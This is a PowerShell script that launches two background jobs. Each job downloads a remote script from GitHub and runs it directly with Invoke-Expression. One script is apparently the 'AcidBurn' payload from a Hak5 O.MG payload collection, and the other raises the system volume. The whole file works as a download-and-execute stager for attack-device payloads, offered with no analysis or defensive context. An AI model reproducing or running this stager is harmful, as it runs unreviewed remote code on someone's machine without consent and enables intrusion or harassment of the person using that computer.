
# Define the URL for AcidBurn.ps1 and volume_increase.ps1
$urlAcidBurn = "https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-AcidBurn/AcidBurn.ps1?dl=1"
$urlVolumeIncrease = "https://raw.githubusercontent.com/Muhammad-Hayyan/vol_increase/main/vol.ps1?dl=1"

# Start the AcidBurn script in a background job
$acidBurnJob = Start-Job -ScriptBlock {
    try {
        Write-Host "Fetching AcidBurn script..."
        $scriptAcidBurn = Invoke-WebRequest -Uri $using:urlAcidBurn -Method Get
        Write-Host "Running AcidBurn script..."
        Invoke-Expression $scriptAcidBurn.Content
        Write-Host "AcidBurn script completed!"
    } catch {
        Write-Host "Error running AcidBurn script: $_"
    }
}

# Start the volume increase script in a background job
$volumeIncreaseJob = Start-Job -ScriptBlock {
    try {
        Write-Host "Fetching Volume Increase script..."
        $scriptVolumeIncrease = Invoke-WebRequest -Uri $using:urlVolumeIncrease -Method Get
        Write-Host "Running Volume Increase script..."
        Invoke-Expression $scriptVolumeIncrease.Content
        Write-Host "Volume Increase script completed!"
    } catch {
        Write-Host "Error running Volume Increase script: $_"
    }
}

# Check the output of both jobs
Wait-Job -Job $acidBurnJob, $volumeIncreaseJob
Receive-Job -Job $acidBurnJob
Receive-Job -Job $volumeIncreaseJob



